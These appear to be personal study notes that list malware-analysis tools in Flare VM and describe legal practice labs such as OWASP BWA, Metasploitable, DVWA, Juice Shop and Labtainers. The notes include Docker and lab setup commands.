Many tools for reverse engineering and malware analysis are pre-built into Flare VM, including :
- **Reverse Engineering and Debugging**
  - Ghidra : open-source reverse engineering suite
  - x64dbg : open-source debugger for binaries in x32 and x64 format
  - OllyDbg : debugger for reverse-engineering at assembly level
- **Disassemblers and Decompiler**
  - CFF Explorer : text editor to edit and analyze PE files (Portable Executable)
  - Hopper Disassembler : debugger, disassembler and decompiler
- **Static and Dynamic Analysis**
  - PEStudio : static analysis on an executable file without running it
  - Process Hacker : advanced memory editor and process watcher
  - PEview : viewer of PE file for analysis
  - Dependency Walker : tool to display an executable's DLL dependencies
- **Forensics and Incident Response**
  - Volatility : RAM dump analysis framework
  - Rekall : framework for memory forensics in incident response
  - FTK Imager : forensics tool for disk image creation and analysis
- **Network Analysis**
  - WireShark : network protocol analyzer for traffic recording and analysis
  - Nmap : vulnerability detection and network mapping tool
  - Netcat : read and write data across network connections
- **File analysis**
  - FileInsight : program to look through and edit binary files
  - Hex Fiend : light Hex editor



## Educational Tools


### Oxford Journal of Cyber-Security

Academic Journal from Oxford university offering free articles about Cyber-Security threats, attacks and latest defenses :  
[https://academic.oup.com/cybersecurity](https://academic.oup.com/cybersecurity)


### Hacksplaining

[Hacksplaining](https://www.hacksplaining.com/) is a security training website.  
It explains and gives examples of most common web security issues, especially the OWASP Top 10 issues.


### OWASP BWA (Broken Web Applications)

OWASP BWA is a project from the OWASP organization (Open Worldwide Application Security Project) focusing on the identification and documentation of vulnerabilities in web applications.  
It is a virtual machine image that can be launched with VMware, that contains several vulnerable web applications using legacy software versions.  

When started with VMware, we can log to the VM and check its IP, then access the web portal from `http://<VM_IP>`.  
The portal lists all the broken web applications contained in the project.  
Some of them contain cyber-security trainings to learn web application vulnerabilities (WebGoat, Ghost...).  
Others use old version of some CMS that have known vulnerabilities (WordPress, Joomla, ...).  
Others are created to look more like real modern applications (Google Gruyere, Hackxor...).  

OWASP BWA is a great tool to create a local lab to test cyber-security tools (nmap, burp, metasploit...) on machines we own.


### Metasploitable

Metasploitable is a deliberately vulnerable Linux VM created by Rapid7 (creators of Metasploit) for practising penetration tests.  
It is commonly used with Metasploit, but can be attacked manually with Nmap, Hydra, Nikto, Burp...  
- **Metasploitable 2** (2012) : Ubuntu 8.04 VM containing misconfigured services and vulnerable applications
- **Metasploitable 3** (2016) : Windows Server 2008 or Ubuntu 14.04 VM containing more modern attack scenarios


### DVWA (Damn Vulnerable Web App)

DVWA is another intentionally insecure web application built with PHP and MySQL for educational purpose.  
It has many vulnerability types, and a well organized menu to explain each vulnerability.  
It has 3 levels or security that can be selected : Low, Medium and High.  
We can even see the source code of each security level for each vulnerability, as well as a fully secure version.


### VulnHub

[VulnHub](www.vulnhub.com) is an online platform providing free and legally accessible vulnerable VMs for security enthusiasts to practice their skills.  
These VMs are prepackaged as OVA files that can be started with VirtualBox or VMware.  
There are multiple difficulty levels, and most VMs follow the CTF format (Capture The Flag).  


### OWASP Juice Shop

OWASP Juice Shop is a fake e-commerce web application designed with intentional security flaws.  
It can be deployed locally in a container, and its aim is to teach web vulnerabilities.  
It is designed as a hacking game, and contains a score dashboard with a lot of challenges to break the website.

```shell
# install and start Docker
sudo apt install docker.io docker-cli
sudo systemctl enable docker --now

# download the Juice Shop Docker image and start a container running it in a Node.js web server
docker pull bkimminich/juice-shop
docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop
```


### Altoro Mutual

Altoro Mutual is a fake banking website with intentional security flaws.  
It is developed by IBM to demonstrate the efficiency of their security products.  

The application code is open source and available on [GitHub](https://github.com/HCL-TECH-SOFTWARE/AltoroJ).


### Labtainers

Labtainers is a fully packaged set of Linux-based cyber-security lab exercises, developed by the Naval Postgraduate School.  
It offers a VM (either VirtualBox or VMware) to download and start as a fully isolated environment.  
From inside the VM, we can start or stop a lab, and see the details of each lab in their PDF documentation.  
When we start a lab, it creates a Docker container and starts a shell inside it.

```shell
# inside the VM, go to the student workspace
cd ${LABTAINER_DIR}/scripts/labtainer-student

# list all available labs
labtainer

# start a lab : it shows the PDF link, starts a Docker container and opens a terminal inside it
labtainer wireshark-intro

# check that the task of the lab was successfully completed
checkwork

# stop the currently running lab
stoplab
```


### OverTheWire Wargames

[OverTheWire](https://overthewire.org/wargames/) is a community of volunteers that offer free educational cyber-security wargames.  
Each wargame is built in many levels, where we need to unlock a password to gain access to the next level.  
